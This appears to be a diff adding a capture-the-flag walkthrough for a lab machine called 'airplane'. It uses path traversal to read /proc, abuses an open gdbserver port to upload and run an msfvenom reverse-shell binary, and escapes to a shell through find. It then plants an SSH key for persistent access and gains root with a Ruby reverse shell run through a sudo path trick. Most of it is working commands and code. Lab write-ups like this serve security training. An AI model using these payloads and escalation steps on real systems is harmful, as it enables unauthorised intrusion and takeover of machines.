@@ -1,0 +1,82 @@
+../../../../../proc/sched_debug
+../../../../../proc/564/stat
+../../../../../proc/526/cmdline
+
+
+/usr/bin/gdbserverk:6048 (gdbserver port is open)
+
+
+gdbserver is a program that allows you to remotely debug applications using the GNU Debugger (GDB). It runs on the target system where the application to be debugged is running, 
+and it communicates with a GDB instance running on another system (usually the host or development machine).
+
+
+# Trick shared by @B1n4rySh4d0w
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf
+
+chmod +x binary.elf
+
+gdb binary.elf
+
+# Set remote debuger target
+target extended-remote 10.10.10.11:6048
+
+# Upload elf file
+remote put binary.elf /tmp/binary.elf (instead of debugging file)
+
+# Set remote executable file
+set remote exec-file /tmp/binary.elf
+
+# Execute reverse shell executable
+run
+
+# You should get your reverse-shell
+
+find command can be executed by carlos user
+-------------------------------------------
+
+#/usr/bin/find . -exec /bin/sh \; -quit
+
+I got carlos user access but it is not fully privileged
+
+I have to put my own .id_rsa_pub key to the target user
+
+In carlos
+---------
+
+#touch authorized_keys
+#echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJlGWJbL2aqQTeEABr4tnl4NVBFwt5aq+ZloMtrwDhe7DWZiZfoJkvhdbJZByq0jT/4QPfEi5IaHBYeGMQwgzF5B+7lGe0C31EQTuG6kjG67IMVBtt3xThMP8q=username@kali" >> authorized_keys
+#chmod 644 authorized_keys
+
+In hacker
+---------
+
+#ssh carlos@airplane.thm
+
+
+Matching Defaults entries for carlos on airplane:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User carlos may run the following commands on airplane:
+    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+
+
+Create a ruby reverse shell
+
+#!/usr/bin/env ruby
+# syscall 33 = dup2 on 64-bit Linux
+# syscall 63 = dup2 on 32-bit Linux
+# test with nc -lvp 1337 
+
+require 'socket'
+
+s = Socket.new 2,1
+s.connect Socket.sockaddr_in 1337, '10.34.55.33'
+
+[0,1,2].each { |fd| syscall 33, s.fileno, fd }
+exec '/bin/sh -i'
+
+#sudo /usr/bin/ruby/ /root/../home/carlos/shell.rb
+
+
+I got root access.
+
